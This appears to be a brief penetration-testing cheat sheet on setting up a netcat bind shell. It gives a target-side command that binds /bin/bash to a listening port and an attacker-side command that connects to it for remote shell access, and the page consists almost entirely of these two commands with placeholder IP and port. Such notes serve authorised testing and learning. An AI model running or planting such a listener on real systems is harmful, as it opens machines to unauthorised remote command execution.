---
description: Creating bind shells with netcat
---

# Netcat

## Basic Bind Shell

### Target Machine

The listener must first be started on the target machine and _bound_ to a network port.

#### Linux

```bash
user@target:~$ nc -lnvp {PORT} -e /bin/bash
```

### Attacker Machine

The attacking machine can then simply reach out to the listener

```
kali@kali:~$ nc {IP} {PORT}
```
